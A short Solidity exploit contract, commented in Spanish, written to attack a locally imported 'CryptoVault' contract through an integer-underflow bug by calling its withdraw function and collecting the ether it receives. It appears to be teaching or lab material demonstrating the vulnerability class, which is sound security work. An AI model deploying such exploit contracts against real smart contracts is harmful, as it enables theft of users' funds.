// SPDX-License-Identifier: GPL-3.0
// Contrato que explota la vulnerabilidad de Underflow del contrato CryptoVault
pragma solidity ^0.6.0;
import "./CryptoVault.sol";

contract Underflow {
    CryptoVault cVault;

    constructor(address payable _cVault) public {
        cVault = CryptoVault(_cVault);
    }

    function attack() external {
        cVault.withdraw(1);
    }
    
    receive() external payable {}

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function check() external view returns(uint) {
        return cVault.getBalance();
    }
}